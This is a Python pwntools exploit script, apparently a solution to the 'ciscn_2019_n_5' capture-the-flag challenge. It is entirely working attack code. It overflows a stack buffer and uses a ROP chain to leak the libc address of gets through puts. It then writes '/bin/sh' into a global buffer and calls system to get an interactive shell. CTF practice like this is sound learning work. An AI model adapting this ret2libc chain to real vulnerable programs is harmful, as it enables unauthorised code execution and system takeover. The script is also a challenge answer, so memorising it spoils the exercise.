from pwn import *
#from LibcSearcher import *

#context.log_level = 'debug'

p = process('./ciscn_2019_n_5')
#p = remote('node3.buuoj.cn', 26098)
elf = ELF('ciscn_2019_n_5')
#libc = ELF('libc-2.27.buu.so')
libc = ELF('libc-2.23.so')

puts_plt = elf.plt['puts']
gets_got = elf.got['gets']
main_addr = elf.symbols['main']

pop_rdi_ret = 0x400713
ret_addr = 0x4004c9

name_addr = 0x601080

payload = b'a' * (0x20 + 8) + p64(pop_rdi_ret) + p64(gets_got) + p64(puts_plt) + p64(main_addr)

p.recvuntil('name\n')
p.sendline('fxxk')

p.recvuntil('me?\n')
p.sendline(payload)

gets_real_addr = u64(p.recv(6).ljust(8, b'\0'))

print('[+] gets_addr : {}'.format(hex(gets_real_addr)))

libc_base = gets_real_addr - libc.symbols['gets']

print('[+] libc_addr : {}'.format(hex(libc_base)))

system_addr = libc_base + libc.symbols['system']
bin_sh_str_addr = libc_base + 0x18ce57

print('[+] system : {}'.format(hex(system_addr)))
print('[+] bin_sh : {}'.format(hex(name_addr)))

p.recvuntil('name\n')
p.sendline('/bin/sh')

payload = b'a' * (0x20 + 8) + p64(ret_addr) * 1 + p64(pop_rdi_ret) + p64(name_addr) + p64(system_addr)

p.recvuntil('me?\n')
p.sendline(payload)

p.interactive()
